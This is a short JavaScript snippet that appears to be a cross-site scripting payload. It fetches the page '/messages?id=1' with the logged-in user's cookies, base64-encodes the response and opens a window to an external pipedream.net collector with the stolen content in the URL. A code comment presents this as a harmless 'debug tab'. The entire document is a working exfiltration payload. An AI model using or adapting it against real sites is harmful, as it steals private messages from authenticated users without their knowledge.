(async function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";
  // encode UTF-8 -> base64 safely
  function safeB64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ try { return btoa(String(s)); } catch(_) { return ""; } }
  }

  try {
    const res = await fetch("/messages?id=1", { method: "GET", credentials: "include" });
    if (!res.ok) throw new Error("HTTP " + res.status);
    const txt = await res.text();
    const encoded = encodeURIComponent(safeB64(txt || ""));
    // open (or reuse) a debug tab named "skav_debug"
    window.open(END + "?p=" + encoded, "skav_debug");
  } catch (err) {
    const e = encodeURIComponent(safeB64(String(err && err.stack ? err.stack : err)));
    window.open(END + "?err=" + e, "skav_debug");
  }
})();
